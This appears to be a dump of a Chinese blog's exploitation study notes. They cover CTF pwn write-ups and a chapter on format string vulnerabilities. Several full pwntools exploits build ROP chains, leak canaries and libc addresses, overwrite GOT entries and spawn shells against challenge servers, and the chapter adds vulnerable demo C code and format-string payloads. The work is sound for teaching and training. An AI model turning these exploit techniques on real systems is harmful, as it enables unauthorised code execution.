本来是把返回地址覆盖为hackhere函数，但是pwn的时候，系统显示找不到bash。。。然后又利用puts函数打印出puts的地址和__libc_start_main的地址去libc-database搜，但是搜不到对应的libc，又想在栈上构造/bin/sh，但是无法泄露出栈的地址，，，无奈之下，看了别人的WP，原来执行system(sh)也可以，不用加路径。。。。EXP为 12345678910111213141516171819202122232425262728from pwn import *# io = process(&#x27;3fb1a42837be485aae7d85d11fbc457b&#x27;)\\io = remote(&quot;111.200.241.244&quot;, 50279)# context.log_level = &quot;debug&quot;backdoor = 0x804859Bbackdoor_addr_bytes = p32(backdoor)io.sendlineafter(&quot;you have:\\n&quot;, b&#x27;0&#x27;)def auto_send(data, _offset=132): # 132 is return address for i in range(len(data)): io.sendlineafter(&#x27;exit\\n&#x27;, b&#x27;3&#x27;) io.sendlineafter(&#x27;number to change:\\n&#x27;, str(_offset+i).encode()) io.sendlineafter(&#x27;new number:\\n&#x27;, str(data[i]).encode()) sh_addr = 0x8048987system_addr = 0x8048450payload = p32()+ b&#x27;A&#x27; * 4 + p32(sh_addr)auto_send(payload)io.sendlineafter(&#x27;exit\\n&#x27;, b&#x27;5&#x27;)io.interactive() 5. pwn-100L-CTF-2016 泄露地址 1234567891011121314151617181920212223242526272829303132from pwn import *from binascii import *io = process(&quot;bee9f73f50d2487e911da791273ae5a3&quot;)io = remote(&quot;111.200.241.244&quot;, 61302)elf = ELF(&quot;bee9f73f50d2487e911da791273ae5a3&quot;)pop_rdi_addr = 0x00400763context.log_level = &quot;debug&quot;payload = b&#x27;A&#x27; * 72 + p64(pop_rdi_addr) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.plt[&#x27;puts&#x27;])payload += p64(pop_rdi_addr) + p64(elf.got[&#x27;setbuf&#x27;]) + p64(elf.plt[&#x27;puts&#x27;])payload += p64(pop_rdi_addr) + p64(elf.got[&#x27;read&#x27;]) + p64(elf.plt[&#x27;puts&#x27;])payload += p64(pop_rdi_addr) + p64(elf.got[&#x27;__libc_start_main&#x27;]) + p64(elf.plt[&#x27;puts&#x27;])payload = payload.ljust(200, b&#x27;A&#x27;)io.send(payload)io.recvuntil(&quot;bye~\\n&quot;)res = io.recvline(6)log.info(&quot;puts: %s&quot; % hexlify(res[::-1][1:]))res = io.recvline(6)log.info(&quot;setbuf: %s&quot; % hexlify(res[::-1][1:]))res = io.recvline(6)log.info(&quot;read: %s&quot; % hexlify(res[::-1][1:]))res = io.recvline(6)log.info(&quot;__libc_start_main: %s&quot; % hexlify(res[::-1][1:])) 然后去libc-database查询libc exp为 1234567891011121314151617181920212223242526272829303132from pwn import *from binascii import *# io = process(&quot;bee9f73f50d2487e911da791273ae5a3&quot;)io = remote(&quot;111.200.241.244&quot;, 61302)elf = ELF(&quot;bee9f73f50d2487e911da791273ae5a3&quot;)pop_rdi_addr = 0x00400763puts_offset = 0x6f690str_bin_sh_offset = 0x18cd57system_offset = 0x45390read200func_addr = 0x040068Econtext.log_level = &quot;debug&quot;payload = b&#x27;A&#x27; * 72 + p64(pop_rdi_addr) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.plt[&#x27;puts&#x27;]) + p64(read200func_addr)payload = payload.ljust(200, b&#x27;A&#x27;)io.send(payload)io.recvuntil(&quot;bye~\\n&quot;)puts_addr = u64(io.recvline()[:-1].ljust(8, b&#x27;\\x00&#x27;))log.info(&quot;puts : %s&quot; % hex(puts_addr))libc_base = puts_addr - puts_offsetpayload = b&#x27;A&#x27; * 72 + p64(pop_rdi_addr) + p64(libc_base + str_bin_sh_offset) + p64(libc_base + system_offset)payload = payload.ljust(200, b&#x27;A&#x27;)io.send(payload)io.recvuntil(&quot;bye~\\n&quot;)io.interactive() 6. warmupcsaw-ctf-2016-quals 题目没有附件，先nc看看 程序输出了一个地址，因为是0X400000 + 0X60D猜测这是get_shell或输出flag的地址，然后让咱们输入，输入格式化字符串的数据并没有什么效果，猜测是栈溢出，然后写脚本爆破即可 123456789101112131415161718from pwn import *addr = 0x40060ddef pwn(): for i in range(0, 100): payload = b&#x27;A&#x27; * i + p64(addr) try: io = remote(&quot;111.200.241.244&quot;, 51136) io.sendlineafter(&quot;&gt;&quot;, payload) # sleep(0.1) c = io.recv() log.info(&quot;&#123;&#125;: Info: &#123;&#125;&quot;.format(i, c)) continue except EOFError as e: log.info(&quot;badsize: %d&quot; % i) io.close()pwn() 7. 反应釜开关控制XCTF 4th-CyberEarth 下载附件，IDA查看就是普通的栈溢出，溢出3次，即可getshell，或者第一次溢出就改为get shell的地址 1234567891011121314151617181920212223242526from pwn import *io = process(&quot;./ad72d90fbd4746ac8ea80041a1f661c2&quot;)io = remote(&quot;111.200.241.244&quot;, 51643)io.recvuntil(&quot;witch is:&quot;)easy_addr = int(io.recvuntil(&quot;\\n&quot;).decode(), 16)log.info(&quot;easy addr: 0x%x&quot; % easy_addr)payload1 = b&#x27;A&#x27; * 520 + p64(easy_addr)io.sendline(payload1)io.recvuntil(&quot;witch is:&quot;)normal_addr = int(io.recvuntil(&quot;\\n&quot;).decode(), 16)log.info(&quot;normal addr: 0x%x&quot; % normal_addr)payload2 = b&#x27;A&#x27; * 392 + p64(normal_addr)io.sendline(payload2)io.recvuntil(&quot;witch is:&quot;)shell_addr = int(io.recvuntil(&quot;\\n&quot;).decode(), 16)log.info(&quot;shell addr: 0x%x&quot; % shell_addr)payload3 = b&#x27;A&#x27;* 264 + p64(shell_addr)io.sendline(payload3)io.interactive() 8. 实时数据监测IDA打开分析，格式化字符串漏洞，直接用fmtstr_payload 构造payload即可 123456789101112from pwn import *key_address = 0x0804A048value = 0x2223322# io = process(&quot;9926c1a194794984978011fc619e3301&quot;)io = remote(&#x27;111.200.241.244&#x27;, 62045)payload = fmtstr_payload(12, &#123;key_address: value&#125;)io.send(payload)io.interactive() 9. welpwnRCTF-2015 IDA打开程序分析 这个位置存在栈溢出漏洞，但是会被\\0截断，在strcmp那里下断点，即让它复制完之后下断点，观察栈的数据，发现截断后的数据紧跟着原始数据 这样就可以构造ROP链泄露出puts的地址，进而搜到libc的地址，然后再找到system的地址就OK了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *elf = ELF(&quot;81f42c219e81421ebfd1bedd19cf7eff&quot;)# io = process(&quot;81f42c219e81421ebfd1bedd19cf7eff&quot;)# io =remote(&quot;111.200.241.244&quot; ,64634)# io = remote(&#x27;127.0.0.1&#x27;, 10001)io = remote(&quot;111.200.241.244&quot;, 62546)context.log_level = &quot;debug&quot;c = io.recv()pop_rdi_addr = 0x04008a3pop_r13_r14_r15_addr = 0x040089epayload = b&#x27;A&#x27; * 24payload += p64(pop_r13_r14_r15_addr)payload += b&#x27;A&#x27; * 24payload += p64(pop_rdi_addr) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.plt[&#x27;puts&#x27;]) # shellcode startpayload += p64(pop_rdi_addr) + p64(elf.got[&#x27;write&#x27;]) + p64(elf.plt[&#x27;puts&#x27;])payload += p64(pop_rdi_addr) + p64(elf.got[&#x27;read&#x27;]) + p64(elf.plt[&#x27;puts&#x27;])payload += p64(0x0004007CD) # func mainio.sendline(payload)io.recvuntil(b&quot;\\x40&quot;)puts_addr_byte = u64(io.recvline(6)[:-1].ljust(8, b&#x27;\\x00&#x27;))log.info(&quot;puts_addr: %s&quot; % hex(puts_addr_byte))write_addr_byte = u64(io.recvline(6)[:-1].ljust(8, b&#x27;\\x00&#x27;))log.info(&quot;write_addr: %s&quot; % hex(write_addr_byte))read_addr_byte = u64(io.recvline(6)[:-1].ljust(8, b&#x27;\\x00&#x27;))log.info(&quot;read_addr: %s&quot; % hex(read_addr_byte))libc_base = write_addr_byte - 0xf72b0ret_addr = 0x00004007CClog.info(&quot;libc_base: %s&quot; % hex(libc_base))system_address = libc_base + 0x45390str_bin_sh_address = libc_base + 0x18cd57payload2 = b&#x27;A&#x27; * 24payload2 += p64(pop_r13_r14_r15_addr)payload2 += b&#x27;A&#x27; * 24payload2 += p64(ret_addr)payload2 += p64(pop_rdi_addr) + p64(str_bin_sh_address)payload2 += p64(system_address)io.sendline(payload2)io.interactive() 这里有个地方要注意一下 在构造ROP链的时候直接打印puts，write，read函数地址，然后如果下面没有stop gadget的话，在下面ecv()的时候，如果是process就可以接收到，但是remote就EOF了，如果在构造ROP链的时候在 p64(pop_rdi_addr) + p64(elf.got[‘puts’]) + p64(elf.plt[‘puts’]) 之后加一个stop gadgets，这样就可以了，估计是没加stop_gadgets，还没有recv，程序就挂了, 比如下面这种代码 123456789101112131415161718192021from pwn import *elf = ELF(&quot;81f42c219e81421ebfd1bedd19cf7eff&quot;)io = remote(&#x27;127.0.0.1&#x27;, 10001)context.log_level = &quot;debug&quot;c = io.recv()pop_rdi_addr = 0x04008a3pop_r13_r14_r15_addr = 0x040089epayload = b&#x27;A&#x27; * 24payload += p64(pop_r13_r14_r15_addr)payload += b&#x27;A&#x27; * 24payload += p64(pop_rdi_addr) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.plt[&#x27;puts&#x27;]) # shellcode startpayload += p64(pop_rdi_addr) + p64(elf.got[&#x27;write&#x27;]) + p64(elf.plt[&#x27;puts&#x27;])payload += p64(pop_rdi_addr) + p64(elf.got[&#x27;read&#x27;]) + p64(elf.plt[&#x27;puts&#x27;]) # payload += p64(0x004007CD) 如果没有这一行的话会出错，0x4007CD是main函数的地址io.sendline(payload)io.recv() 10. pwn1厦门邀请赛 IDA打开分析 存在栈溢出漏洞，但是程序开了栈保护，所以得首先泄露出canary 由于程序是输入2是打印，所以可以输入足够长的数据一直到正好不覆盖canary，然后输入1，将cannary顺带这打印出来，就达到了泄露canary的目的， 这样就可以构造ROP链打印puts函数地址然后再返回main函数，打印puts函数地址是为了获取libc的基地址，进而获得system函数的地址，重新回到main函数这里是为了再次输入构造ROP链执行system(“bin/sh”)，但是执行system(“bin/sh”)的时候有问题，服务器总是提示错误，于是我将bin/sh的地址换成了ls的地址，可以打印出目录下的文件，所以还需要调用read函数。输入’cat flag’， 然后执行system(‘cat flag’) cat flag字符串把它存在0x601000的位置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *elf = ELF(&quot;babystack&quot;)# libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) # io = process(&quot;babystack&quot;)libc = ELF(&quot;libc-2.23.so&quot;)io = remote(&quot;111.200.241.244&quot;, 56538)context.log_level = &quot;debug&quot;pop_rdi_addr = 0x0400a93pop_rsi_r15_addr = 0x0400a91main_addr = 0x0400908payload = b&quot;A&quot; * 136io.sendafter(b&quot;&gt;&gt; &quot;, b&#x27;1&#x27;)io.sendline(payload)io.sendafter(b&quot;&gt;&gt; &quot;, b&#x27;2&#x27;)io.recvuntil(b&quot;\\n&quot;)cnanry_byte = io.recv(7)canary = u64(cnanry_byte.rjust(8, b&#x27;\\x00&#x27;))log.info(&quot;canary : 0x%x&quot; % canary)io.sendafter(b&quot;&gt;&gt; &quot;, b&#x27;1&#x27;)cat_flag_addr = 0x000000601000 payload = b&#x27;A&#x27; * 136 + p64(canary) +p64(0)payload += p64(pop_rdi_addr) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.plt[&#x27;puts&#x27;])payload += p64(pop_rdi_addr) + p64(0) # rdi = 0payload += p64(pop_rsi_r15_addr) +p64(cat_flag_addr) + p64(0) # rsi = 0x00000601000 payload += p64(elf.plt[&#x27;read&#x27;]) # read(0, rsi, ?) #payload += p64(main_addr) # 重新回到main函数，为了 执行system(&quot;cat flag&quot;)io.send(payload)io.sendafter(b&quot;&gt;&gt; &quot;, b&#x27;3&#x27;)puts_address = u64(io.recv(6).ljust(8, b&#x27;\\x00&#x27;))log.info(&quot;puts_address: %s&quot; % hex(puts_address))libc_base = puts_address - libc.symbols[&#x27;puts&#x27;]log.info(&quot;libc_base: %s&quot; % hex(libc_base))io.send(b&#x27;cat flag&#x27;) #read函数的时候，输入cat flagio.sendafter(b&quot;&gt;&gt; &quot;, b&#x27;1&#x27;)system_addr = libc_base + libc.symbols[&#x27;system&#x27;]payload = b&quot;A&quot; * 136 + p64(canary) +p64(0)payload += p64(0x400A2A)# retpayload += p64(pop_rdi_addr) + p64(cat_flag_addr) + p64(system_addr)io.send(payload)io.sendafter(b&quot;&gt;&gt; &quot;, b&#x27;3&#x27;)io.recv()","categories":[{"name":"pwn学习","slug":"pwn学习","permalink":"https://zzzzsky.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://zzzzsky.github.io/tags/pwn/"}]},{"title":"第9章_格式化字符串","slug":"第9章_格式化字符串","date":"2022-03-27T08:47:00.000Z","updated":"2022-03-27T08:47:57.091Z","comments":true,"path":"2022/03/27/第9章_格式化字符串/","link":"","permalink":"https://zzzzsky.github.io/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"","text":"基本原理格式化字符串漏洞如今在桌面端已经比较少见了，但在物联网设备上依然层出不穷。 原理通过一个例子来说明 1234567#include &lt;stdio.h&gt;int main()&#123; printf(&quot;%s %d %s %x %x %x %3$s&quot;, &quot;Hello World!&quot;, 233, &quot;test&quot;); return 0;&#125; 1gcc -g -m32 -z execstack -no-pie -fno-stack-protector main.c gdb 调试起来，在printf函数那下断点，观察参数 此时栈上的参数为这些（绿色），但是%s %d %s %x %x %x %3$s ( %$3s 是打印可变参数中的第3个，以字符串的形式打印), 但是由于格式化要求的参数和实际提供的参数不一致，所以它会继续从栈上取参数，即红色的部分，这样就造成了数据的泄露 所以，格式化字符串漏洞发生的条件就是 格式字符串要求的参数和实际提供的参数不匹配 漏洞利用对于格式化字符串漏洞的利用主要有：使程序崩溃、栈数据泄露、任意地址内存泄露、栈数据覆盖、任意地址内存覆盖 使程序崩溃在Linux中，存取无效的指针会使进程收到SIGSEGV信号，从而使程序非正常终止并产生核心转储，其中存储了程序崩溃时的许多重要信息，而这些信息正是攻击者所需要的。使用类似下面的格式字符串即可触发崩溃。 1printf(&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;); 对于每一个%s, printf 都要从栈上获取一个数字，将其视为字符串的地址进行打印，直到出现一个空字符 获取的某个数字可能不是一个地址 获取的数字确实是一个地址，但是这个地址时受保护的 栈数据泄露使程序崩溃只是验证漏洞的第一步，攻击者还可以利用格式化函数获得内存数据，为漏洞利用做准备。 用以下代码测试 123456789101112#include &lt;stdio.h&gt;int main()&#123; char format[128]; int arg1 = 1, arg2 =0x88888888, arg3 = -1; char arg4[10] = &quot;ABCD&quot;; scanf(&quot;%s&quot;, format); printf(format, arg1, arg2, arg3, arg4); printf(&quot;\\n&quot;); return 0; 12echo 0 &gt; /proc/sys/kernel/randomize_va_spacegcc -m32 -fno-stack-protector -no-pie main.c -o fmtdemo 输入 %08x.%08x.%08x.%08x.%08x 作为格式化字符串 观察栈，绿框中是5个参数 因为输入了5个%08x，所以在可变参数中要打印出5个来，而现在只有4个，剩下那个它就顺着栈继续往下找了，即打印的0xffffcf64 现在已经知道了如何按顺序泄露栈数据，那么如果想直接泄露指定的某个数据，则可以用下面类似的格式字符串，这里的n表示位于格式字符串后的第n个数据，即可变参数中第几个（从1开始） %&lt;arg#&gt;$&lt;format&gt; 例如 %3$x表示以16进制形式打印第3个可变参数，下面进行测试 输入: %3$x.%1$08x 输出: 任意地址内存泄露我们可以使用类似%s格式规范，可以泄露出参数（指针）所指向的内存的数据，程序会将它作为一个ASCII字符串处理，直到遇到空字符，如果我们可以操控这个参数的值，那么就可以泄露出任意地址的内容。 输入%4$s，然后在call 0x8048350 &lt;printf@plt&gt;调用前下断点，观察栈的情况 接下来尝试获取任意内存的数据，输入AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p 发现0X41414141存在可变参数的第13个位置上，所以，只要输入AAAA%13$s就可以读取0x41414141这个地址的数据了，虽然0x41414141并不是个有效的地址，但是我们可以把它变为合法的地址然后再次输入 比如ABCD字符串的地址是0xffffcf5a，所以我们用此地址测试 1python -c &#x27;print(&quot;\\x5a\\xcf\\xff\\xff.%13$s&quot;)&#x27; &gt; text 于是打印出了字符串ABCD，我们可以利用这种方法，把某函数的GOT地址传进去，这样就可以得到虚拟地址了，然后根据其在libc的偏移吗，就可以得到任意函数地址，比如 system() 1python -c &quot;print(&#x27;\\x18\\xa0\\x04\\x08&#x27; + &#x27;.%13$s&#x27;)&quot; &gt; text 这里用 0x804a00c 这个地址的话会有问题，估计是r &lt; ./text的原因，书上说的是不可见字符的原因，同样会被省略的还有\\x07, \\x08, \\x20等 虽然0xf7e3fe00仍然是个指针，不是字符数据，打印并不成功，但是借助pwntools可以得到地址数据并进行利用（后面看到这里的时候再说。。。。） 栈数据覆盖通过%n转换提示符，可以将当前已经成功写入流或缓冲区的字符个数存储到由参数指定的整数中。 测试代码如下 1234567891011#include &lt;stdio.h&gt;int main()&#123; int i; char str[] = &quot;hello&quot;; printf(&quot;%s %n\\n&quot;, str, &amp;i); printf(&quot;%d\\n&quot;, i); return 0;&#125; 回到fmtdemo那个程序，尝试将argv2改为其他0x20 看到argv2的地址时0xffffcf38，于是构造字符串’\\x38\\xcf\\xff\\xff%08x%08x%012x%13$n’ 在printf那里下断点 任意地址内存覆盖用上面的方法 ‘\\x38\\xcf\\xff\\xff%08x%08x%012x%13$n’ ，只能赋值最小为4的数据，因为前面’\\x38\\xcf\\xff\\xff’ 就占了4个字节 使用’AA%15$nA’ + ‘\\x38\\xcf\\xff\\xff’ 的方法就可以赋值 &lt; 4的数据， 要是赋值一个特别大的数据怎么办，可以直接类似%0123214c的形式，但是这样做占用的内存空间太大，往往会覆盖其他重要的地址而出错。所以，我们尝试通过修改长度修饰符来更改值的大小。 %hhn(单字节), %hn(双字节), %n(4字节), %ln(8字节), %lln(16字节) 接下来我们尝试将0x12345678写入到0xffffcf38的位置, 先尝试输入AAAABBBBCCCCDDDD来看看这几个参数的位置。发现是可变参数的13,14,15,16的位置 12340xffffcf64 -&gt; 0x41414141 (0xffffcf38) -&gt; \\x780xffffcf68 -&gt; 0x42424242 (0xffffcf39) -&gt; \\x560xffffcf6c -&gt; 0x43434343 (0xffffcf40) -&gt; \\x340xffffcf70 -&gt; 0x44444444 (0xffffcf41) -&gt; \\x12 构造特殊格式化字符 12&#x27;\\x38\\xcf\\xff\\xff&#x27; + &#x27;\\x39\\xcf\\xff\\xff&#x27;+ &#x27;\\x3a\\xcf\\xff\\xff&#x27;+ &#x27;\\x3b\\xcf\\xff\\xff&#x27; + &#x27;%104c%13$hhn&#x27; + &#x27;%222c%14$hhn&#x27; + &#x27;%222c%15$hhn&#x27; + &#x27;%222c%16$hhn&#x27; 1echo &quot;\\x38\\xcf\\xff\\xff\\x39\\xcf\\xff\\xff\\x3a\\xcf\\xff\\xff\\x3b\\xcf\\xff\\xff%104c%13\\$hhn%222c%14\\$hhn%222c%15\\$hhn%222c%16\\$hhn&quot; &gt; text 运行printf之后 x86-64中的格式化字符串漏洞在Linux中，前6个参数分别通过RDI, RSI, RDX, RCX, R8, R9传递，在Windows中，前4个参数通过RCX, RDX, R8, R9传递。 将程序编译成64位 1gcc -g -z execstack -no-pie -fno-stack-protector main.c -o fmtdemo64 gdb调试， 输入 AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p 可以发现AAAAAAAA在%8$p的位置，这个时候我们无法修改argv2的值了，因为她被放在了寄存器中 fmtstr模块通过下面例子练习fmtstr模块 123456789101112#include &lt;stdio.h&gt;int main()&#123; char str[1024]; while(1)&#123; memset(str, &#x27;\\0&#x27;, 1024); read(0, str, 1024); printf(str); fflush(stdout); &#125; return 0;&#125; 为了方便测试，关闭ASLR， 关闭PIE。思路就是将printf的地址改为system的地址，然后输入参数/bin/sh 来get shell exp为 12345678910111213141516171819202122232425262728293031323334from pwn import *elf = ELF(&quot;./test&quot;)libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)io = process(&#x27;./test&#x27;)def exec_fmt(payload): # 与服务器交互的函数 io.sendline(payload) info = io.recv() return infoauto = FmtStr(exec_fmt) # 在初始化的时候就计算出了offset，假如输入AAAA，则offset的含义就是AAAA在可变参数中第几个，即%&#123;offset&#125;$soffset = auto.offset # print(offset)printf_got = elf.got[&#x27;printf&#x27;] payload = p32(printf_got) + &#x27;%&#123;&#125;$s&#x27;.format(offset).encode(&#x27;ascii&#x27;) # 获取printf_got这个地址的数据，即printf的地址io.send(payload)printf_addr = u32(io.recv()[4:8])libc_address = printf_addr - libc.symbols[&#x27;printf&#x27;]system_addr = libc_address + libc.symbols[&#x27;system&#x27;] # 根据偏移获取system的地址log.info(&quot;system_addr : %s&quot; % hex(system_addr)) payload = fmtstr_payload(offset, &#123;printf_got : system_addr&#125;) # 将printf_got这个地址处的数据改为system_addrio.send(payload) io.send(&#x27;/bin/sh&#x27;) # 此时printf已经改为了system，发送/bin/sh获取shellio.recv()io.interactive() HITCON CMT 2017: pwn200本题没有从网上找到附件，因为书上给了源码，直接手动编译下 12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void canary_protect_me(void)&#123; system(&quot;/bin/sh&quot;);&#125;int main()&#123; setvbuf(stdout, 0, 2, 0); setvbuf(stdin,0,1, 0); char buf[40]; gets(buf); printf(buf); gets(buf); return 0;&#125; 1gcc -m32 -z noexecstack -no-pie pwn200.c -o pwn200.c 程序开启了Canary，而程序也留有1个后门canary_protect_me，所以我们通过格式化漏洞泄露出canary的值，然后再栈溢出漏洞覆盖掉返回值 因为最后这里，esp = [ebp-4]-4, 所以我们要知道ebp的值，然后+4，填到这个位置。（这也导致了下面的EXP和书上的有所不同 搭建pwn环境 1nohup socat tcp4-listen:10001,reuseaddr,fork exec:./pwn200 &amp; EXP为: 12345678910111213141516171819from pwn import *backdoor = 0x8048566#io = process(&quot;./pwn200&quot;)io = remote(&#x27;127.0.0.1&#x27;, 10001)payload1 = b&quot;%15$x&quot;ebp = 0xffffcf98 # 通过调试得到 &quot;%17$x&quot;得到的数 - 24 就是EBP的值，所以多次尝试，发现%17$x的值一样io.sendline(payload1)canary = int(io.recv().decode(), 16)log.info(&quot;canary: &quot;+ hex(canary))payload2 = b&#x27;A&#x27;* 40 + p32(canary) + b&#x27;A&#x27;*4 + p32(ebp+4)+ p32(backdoor)# gdb.attach(io)# pause()io.sendline(payload2)# pause()io.interactive() 这里写上了EBP的地址，但我知道其实做法肯定是不对的，玩意ebp每次都变，那么将无解，所以正确的做法这里我也不会，(以后碰到了有同种类型的题再研究 NJCTF2017: pingme本题没有给出二进制文件，但是通过输入输出猜测是格式化字符串漏洞，可以无限利用漏洞，于是先把程序dump下来 搭建本地环境 1nohup socat tcp4-listen:10001,reuseaddr,fork exec:./pingme &amp; 12345678910111213141516171819202122232425262728293031323334from pwn import *io = remote(&quot;127.0.0.1&quot;, 10001)def exec_fmt(payload): io.sendline(payload) info = io.recv() return infodef dump_memory(start_addr, end_addr): result = b&quot;&quot; while start_addr &lt; end_addr: io = remote(&quot;127.0.0.1&quot;, 10001) io.recvline() payload = b&quot;%9$s.AAA&quot; + p32(start_addr) io.sendline(payload) data = io.recvuntil(b&#x27;.AAA&#x27;)[:-4] if data == b&quot;&quot;: data = b&quot;\\x00&quot; log.info(&quot;leaking: &#123;0&#125; --- &gt; &#123;1&#125;&quot;.format(hex(start_addr), data)) result += data start_addr += len(data) io.close() return resultio.recvline()auto = FmtStr(exec_fmt)offset = auto.offsetprint(offset) # 7start_addr = 0x8048000end_addr = 0x8049000code_bin = dump_memory(start_addr, end_addr)with open(&quot;code.bin&quot;, &quot;wb&quot;) as f: f.write(code_bin) 成功将程序dump下来，思路是将printf的地址修改为system的地址，然后输入/bin/sh获取shell 对于获取libc的基地址以及system函数的地址有2种方法，第一种方法是泄露出printf函数的地址，然后根据此地址去libc-database去查询，第二种方法用DynELF来获取system的地址，这里第一种方法失败了，不知道为啥，这里先记录下（假设能成功。。。。能以后了解的多了再回来解决这个问题 方法一先查询got表 12345678910111213141516171819readelf -r code.bin Relocation section &#x27;.rel.dyn&#x27; at offset 0x35c contains 3 entries: Offset Info Type Sym.Value Sym. Name08049960 00000606 R_386_GLOB_DAT 00000000 __gmon_start__080499a0 00000d05 R_386_COPY 080499a0 stdin@GLIBC_2.0080499a4 00000b05 R_386_COPY 080499a4 stdout@GLIBC_2.0Relocation section &#x27;.rel.plt&#x27; at offset 0x374 contains 9 entries: Offset Info Type Sym.Value Sym. Name08049970 00000107 R_386_JUMP_SLOT 00000000 setbuf@GLIBC_2.008049974 00000207 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.008049978 00000307 R_386_JUMP_SLOT 00000000 fgets@GLIBC_2.00804997c 00000407 R_386_JUMP_SLOT 00000000 alarm@GLIBC_2.008049980 00000507 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.008049984 00000707 R_386_JUMP_SLOT 00000000 strchr@GLIBC_2.008049988 00000807 R_386_JUMP_SLOT 00000000 strlen@GLIBC_2.00804998c 00000907 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.008049990 00000a07 R_386_JUMP_SLOT 00000000 putchar@GLIBC_2.0 1234567891011121314151617181920212223242526from pwn import *io = remote(&quot;127.0.0.1&quot;, 10001)context.log_level = &quot;debug&quot;def exec_fmt(payload): io.sendline(payload) info = io.recv() return infodef method_1(printf_addr): libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;) libc_addr = printf_addr - libc.symbols[&#x27;printf&#x27;] log.info(&quot;libc_addr: %#x&quot; % libc_addr) system_addr = libc_addr + libc.symbols[&#x27;system&#x27;] log.info(&quot;system_addr: %#x&quot; % system_addr) return system_addrprintf_got = 0x08049974payload = b&quot;%9$s.AAA&quot; + p32(printf_got)io.sendline(payload)data = io.recvuntil(b&#x27;.AAA&#x27;)[:4]printf_addr = u32(data)log.info(&quot;printf_addr: %#x&quot; % printf_addr)io.recvline()# 0xf7e2d520 可以得到printf的地址是0xf7e2d520 ，然后拿着这个地址和printf去Libc-database去搜，但是我没搜到。。。。 123456789101112╭─ ~/Desktop/testC/fmt_test ╰─ uname -aLinux ubuntu 5.4.0-104-generic #118~18.04.1-Ubuntu SMP Thu Mar 3 13:53:15 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux╭─ ~/Desktop/testC/fmt_test ╰─ ldd code.bin linux-gate.so.1 (0xf7fd5000) libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7ddc000) /lib/ld-linux.so.2 (0xf7fd6000)╭─ ~/Desktop/testC/fmt_test ╰─ ls -l /lib/i386-linux-gnu/libc.so.6lrwxrwxrwx 1 root root 12 1月 24 20:53 /lib/i386-linux-gnu/libc.so.6 -&gt; libc-2.27.so 我的虚拟机环境是这样 只能假设搜到了这个libc，然后再获取system的地址覆盖就OK了 EXP为： 12345678910111213141516171819202122232425262728293031323334353637from pwn import *io = remote(&quot;127.0.0.1&quot;, 10001)def exec_fmt(payload): io.sendline(payload) info = io.recv() return infodef method_1(printf_addr): libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;) libc_addr = printf_addr - libc.symbols[&#x27;printf&#x27;] log.info(&quot;libc_addr: %#x&quot; % libc_addr) system_addr = libc_addr + libc.symbols[&#x27;system&#x27;] log.info(&quot;system_addr: %#x&quot; % system_addr) return system_addrio.recvline()auto = FmtStr(exec_fmt)offset = auto.offsetprint(offset)printf_got = 0x08049974payload = b&quot;%9$s.AAA&quot; + p32(printf_got)io.sendline(payload)data = io.recvuntil(b&#x27;.AAA&#x27;)[:4]printf_addr = u32(data)log.info(&quot;printf_addr: %#x&quot; % printf_addr)io.recvline()system_addr = method_1(printf_addr)payload = fmtstr_payload(offset, &#123;printf_got: system_addr&#125;, write_size=&#x27;short&#x27;) # 这个地方要注意一下，题目限制了payload的长度，所以把write_size从byte改为short就可以缩短payload的长度log.info(&quot;len_payload : &quot; + str(len(payload)))print(payload)io.sendline(payload)io.recv()io.sendline(b&quot;/bin/sh&quot;)io.interactive() 方法二123456789101112131415161718192021222324252627282930313233343536from pwn import *from binascii import *io = remote(&quot;127.0.0.1&quot;, 10001)# context.log_level = &quot;debug&quot;def exec_fmt(payload): io.sendline(payload) info = io.recv() return infodef leak(addr): io.recvline() payload = b&#x27;%9$s.AAA&#x27; + p32(addr) io.sendline(payload) data = io.recvuntil(b&#x27;.AAA&#x27;)[:-4] + b&#x27;\\x00&#x27; # \\x00 字符串结尾 log.info(&#x27;leaking: &#123;0&#125;: &#123;1&#125;&#x27;.format(hex(addr), hexlify(data))) return dataprintf_got = 0x08049974# data = DynELF(leak, elf=ELF(&quot;./code.bin&quot;))data = DynELF(leak, 0x08048490)system_addr = data.lookup(&#x27;system&#x27;, &#x27;libc&#x27;)log.info(&quot;ststem_addr : &#123;&#125;&quot;.format(hex(system_addr)))payload = fmtstr_payload(7, &#123;printf_got: system_addr&#125;, write_size=&#x27;short&#x27;)log.info(&quot;len_payload : &quot; + 